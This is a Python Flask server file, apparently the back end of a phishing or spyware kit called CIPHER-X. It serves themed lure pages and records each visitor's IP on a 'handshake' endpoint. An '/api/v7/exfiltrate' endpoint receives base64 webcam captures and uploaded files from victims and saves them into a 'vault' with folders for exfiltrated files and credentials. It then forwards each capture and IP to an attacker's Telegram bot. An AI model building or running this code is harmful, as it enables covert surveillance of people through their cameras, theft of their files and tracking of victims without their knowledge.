import os
import json
import base64
import requests
import threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
from colorama import Fore, init

# --- 1. SYSTEM INITIALIZATION (SOVEREIGN PATH FIX) ---
init(autoreset=True)

# Absolute Path Calculation
# engine.py  core/folder
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(CURRENT_DIR)
TPL_DIR = os.path.join(ROOT_DIR, "web", "templates")
WEB_DIR = os.path.join(ROOT_DIR, "web")

app = Flask(__name__, 
            template_folder=TPL_DIR, 
            static_folder=WEB_DIR, 
            static_url_path='')
CORS(app)

# --- 2. DYNAMIC ENVIRONMENT ---
SELECTED_THEME = os.getenv("CIPHER_THEME", "audit")

# --- 3. VAULT SETUP ---
VAULT_PATH = os.path.join(ROOT_DIR, "vault")
STAGES = {
    "INTEL": os.path.join(VAULT_PATH, "deep_intel"),
    "MEDIA": os.path.join(VAULT_PATH, "neural_media"),
    "FILES": os.path.join(VAULT_PATH, "exfiltrated_files"),
    "CREDS": os.path.join(VAULT_PATH, "credentials")
}
for folder in STAGES.values(): os.makedirs(folder, exist_ok=True)

# --- 4. CONFIGURATION ---
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

def notify(msg, file=None):
    def send():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/"
            if file: requests.post(url+"sendDocument", data={'chat_id': CHAT_ID, 'caption': msg, 'parse_mode': 'Markdown'}, files={'document': open(file, 'rb')})
            else: requests.post(url+"sendMessage", data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
        except: pass
    threading.Thread(target=send).start()

# --- 5. ROUTES ---

@app.route('/')
def serve_node():
    try:
        # Debug print
        print(f"{Fore.CYAN}[*] Attempting to load: {SELECTED_THEME}/index.html")
        print(f"{Fore.YELLOW}[*] From Template Folder: {app.template_folder}")
        return render_template(f'{SELECTED_THEME}/index.html')
    except Exception as e:
        return f"CRITICAL ERROR: Template '{SELECTED_THEME}/index.html' not found in {app.template_folder}. Check your 'web/templates' folder structure."

@app.route('/app.js')
def serve_master_js():
    return send_from_directory(WEB_DIR, 'app.js')

@app.route('/<path:path>')
def serve_assets(path):
    theme_path = os.path.join(TPL_DIR, SELECTED_THEME)
    if os.path.exists(os.path.join(theme_path, path)):
        return send_from_directory(theme_path, path)
    return send_from_directory(WEB_DIR, path)

@app.route('/api/v7/handshake', methods=['POST'])
def handshake():
    data = request.json
    sid = data.get('sid', 'UNK-NODE')
    print(f"{Fore.MAGENTA}[⚡ HANDSHAKE] {sid} | IP: {request.remote_addr}")
    notify(f"🌀 *CIPHER-X: HANDSHAKE*\nID: `{sid}`\nIP: `{request.remote_addr}`")
    return jsonify({"status": "active", "session": sid})

@app.route('/api/v7/exfiltrate', methods=['POST'])
def exfiltrate():
    data = request.json
    try:
        blob = data.get('blob')
        origin = data.get('meta', {}).get('origin', 'cam')
        folder = STAGES["FILES"] if origin == 'upload' else STAGES["MEDIA"]
        
        name = f"CPX_{datetime.now().strftime('%H%M%S_%f')[:10]}.jpg"
        path = os.path.join(folder, name)
        
        with open(path, "wb") as f:
            f.write(base64.b64decode(blob.split(",")[1]))
        
        print(f"{Fore.GREEN}[✔ SECURED] {name} | Origin: {origin}")
        notify(f"📸 *CIPHER-X: CAPTURE*\nID: `{data.get('sid')}`\nType: `{origin}`", path)
        return jsonify({"status": "vaulted"})
    except: return jsonify({"status": "fail"}), 500

if __name__ == "__main__":
    print(f"{Fore.CYAN}>> MASTER ENGINE v10.0 ACTIVE")
    app.run(host='0.0.0.0', port=5000, threaded=True, debug=False)
